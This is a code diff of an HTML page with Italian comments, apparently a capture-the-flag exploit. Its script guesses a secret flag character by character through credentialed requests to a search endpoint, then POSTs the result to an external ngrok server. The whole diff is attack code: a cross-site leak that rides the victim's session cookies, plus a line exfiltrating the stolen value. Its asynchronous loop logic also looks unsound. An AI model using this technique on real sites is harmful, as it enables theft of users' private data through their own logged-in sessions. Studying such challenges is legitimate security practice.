@@ -11,22 +11,16 @@
 
     <script>
         const baseUrl = 'https://matrix.capturetheflags.site/search?s=';
-        let currentFlag = ''; // Iniziamo con una flag vuota
-        let position = 0; // Posizione corrente
+        let currentFlag = 'flag{'; // Iniziamo con "flag{"
+        let position = currentFlag.length; // Imposta la posizione all'inizio della flag
 
         // Funzione per testare i caratteri della flag
         const testChar = () => {
             const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\'; // Caratteri da testare
-
-            if (position >= currentFlag.length + 1) {
-                // Se abbiamo testato tutti i caratteri per la lunghezza attuale, aumenta la lunghezza
-                position = currentFlag.length; // Imposta la posizione alla lunghezza corrente
-                currentFlag += chars[0]; // Inizia con il primo carattere
-                console.log(`Iniziamo a testare la nuova lunghezza: ${currentFlag}`);
-            }
-
+            
+            // Ciclo attraverso i caratteri
             for (let char of chars) {
-                const query = `${baseUrl}${currentFlag.slice(0, position)}${char}`; // Aggiungi il carattere alla query
+                const query = `${baseUrl}${currentFlag}${char}`; // Crea la query
                 fetch(query, {
                     method: 'GET',
                     credentials: 'include', // Include i cookie di sessione
@@ -34,20 +28,30 @@
                 })
                 .then(response => {
                     if (response.ok) {
-                        // Se la risposta è valida, aggiorna la flag e prova il prossimo carattere
-                        currentFlag = currentFlag.slice(0, position) + char;
-                        console.log(`Trovato: ${currentFlag}`);
-                        document.getElementById('results').innerText += `Trovato: ${currentFlag}\n`;
-                        position++; // Passa alla prossima posizione
-                        testChar(); // Chiama ricorsivamente
-                        return; // Interrompe il ciclo
-                    } else if (response.status === 404) {
-                        // Se riceviamo un 404, considera che abbiamo finito
-                        console.log(`Carattere ${char} non valido per la posizione ${position}. Flag conclusa: ${currentFlag}`);
-                        document.getElementById('results').innerText += `Flag conclusa: ${currentFlag}\n`;
-                        return; // Termina il processo
+                        console.log(`Trovato carattere ${char} per la posizione ${position}`);
+                        currentFlag += char; // Aggiungi il carattere trovato
+                        position++; // Incrementa la posizione
+                        testChar(); // Chiama ricorsivamente per testare il prossimo carattere
+                        document.getElementById('results').innerText = `Flag parziale: ${currentFlag}`; // Mostra il progresso
+                        return; // Esci dalla funzione per non continuare con il ciclo
                     } else {
                         console.log(`Carattere ${char} non valido per la posizione ${position}`);
+                        // Se un carattere non è valido e siamo all'ultima posizione testata
+                        if (currentFlag.length > 5) { // Almeno "flag{" deve essere presente
+                            console.log(`Flag completata: ${currentFlag}`);
+                            document.getElementById('results').innerText = `Flag completata: ${currentFlag}`;
+                            // Invia la flag al server Flask
+                            fetch('https://9e94-87-4-142-72.ngrok-free.app/receive_flag', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded',
+                                },
+                                body: `flag=${encodeURIComponent(currentFlag)}` // Invia la flag
+                            })
+                            .then(response => response.text())
+                            .then(data => console.log(data))
+                            .catch(error => console.error('Errore:', error));
+                        }
                     }
                 })
                 .catch(error => console.error('Errore:', error));
